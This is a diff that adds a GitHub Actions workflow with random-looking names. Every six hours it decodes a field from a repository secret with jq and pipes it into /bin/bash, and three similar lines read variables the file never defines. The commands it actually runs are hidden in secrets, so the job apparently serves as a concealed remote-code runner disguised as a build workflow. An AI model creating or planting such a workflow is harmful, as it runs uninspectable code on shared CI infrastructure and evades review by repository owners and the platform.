@@ -1,0 +1,20 @@
+name: republicanscholar
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: republicanscholar
+        env:
+          n939: ${{ secrets.n939 }}
+        run: |
+          echo $n939 | jq -r .yihq4 | /bin/bash
+          echo $dou92714 | jq -r .ntwok2 | /bin/bash
+          echo $yr60 | jq -r .zlvdl9 | /bin/bash
+          echo $tstc6925 | jq -r .tuffg2 | /bin/bash
+
